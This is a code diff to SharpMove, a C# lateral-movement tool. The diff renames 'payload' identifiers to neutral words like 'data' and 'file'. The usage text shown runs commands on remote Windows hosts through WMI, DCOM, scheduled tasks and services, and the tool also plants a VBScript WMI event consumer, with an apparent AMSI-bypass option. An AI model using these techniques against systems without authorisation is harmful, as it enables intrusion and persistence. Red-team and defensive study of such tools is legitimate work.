@@ -13,18 +13,18 @@ namespace SharpMove
     class Program
     {
         //change to whatever vbs you want
-        public static string vbsPayload = @"";
+        public static string vbsdata = @"";
 
         static void Usage()
         {
             Console.WriteLine("\n  SharpMove.exe");
             Console.WriteLine("");
             Console.WriteLine("    SharpMove.exe action=query computername=remote.host.local query=\"select * from win32_process\" username=domain\\user password=password");
-            Console.WriteLine("    SharpMove.exe action=create computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug amsi=true username=domain\\user password=password");
-            Console.WriteLine("    SharpMove.exe action=executevbs computername=remote.host.local throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug amsi=true username=domain\\user password=password");
-            Console.WriteLine("    SharpMove.exe action=taskscheduler computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug taskname=Debug amsi=true username=domain\\user password=password");
-            Console.WriteLine("    SharpMove.exe action=dcom computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug method=ShellBrowserWindow amsi=true");
-            Console.WriteLine("    SharpMove.exe action=scm computername=remote.host.local command=\"C:\\windows\\temp\\payload.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=payload.exe eventname=Debug servicename=WindowsDebug amsi=true");
+            Console.WriteLine("    SharpMove.exe action=create computername=remote.host.local command=\"C:\\windows\\temp\\file.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=file.exe eventname=Debug amsi=true username=domain\\user password=password");
+            Console.WriteLine("    SharpMove.exe action=executevbs computername=remote.host.local throw=wmi location=local droplocation=C:\\Windows\\Temp filename=file.exe eventname=Debug amsi=true username=domain\\user password=password");
+            Console.WriteLine("    SharpMove.exe action=taskscheduler computername=remote.host.local command=\"C:\\windows\\temp\\file.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=file.exe eventname=Debug taskname=Debug amsi=true username=domain\\user password=password");
+            Console.WriteLine("    SharpMove.exe action=dcom computername=remote.host.local command=\"C:\\windows\\temp\\file.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=file.exe eventname=Debug method=ShellBrowserWindow amsi=true");
+            Console.WriteLine("    SharpMove.exe action=scm computername=remote.host.local command=\"C:\\windows\\temp\\file.exe\" throw=wmi location=local droplocation=C:\\Windows\\Temp filename=file.exe eventname=Debug servicename=WindowsDebug amsi=true");
         }
 
         public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
@@ -330,12 +330,12 @@ namespace SharpMove
                 }
 
 
-                // now create the ActiveScriptEventConsumer payload (VBS)
+                // now create the ActiveScriptEventConsumer data (VBS)
                 ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
 
                 myEventConsumer["Name"] = eventName;
                 myEventConsumer["ScriptingEngine"] = "VBScript";
-                myEventConsumer["ScriptText"] = vbsPayload;
+                myEventConsumer["ScriptText"] = vbsdata;
                 myEventConsumer["KillTimeout"] = (UInt32)45;
 
                 try
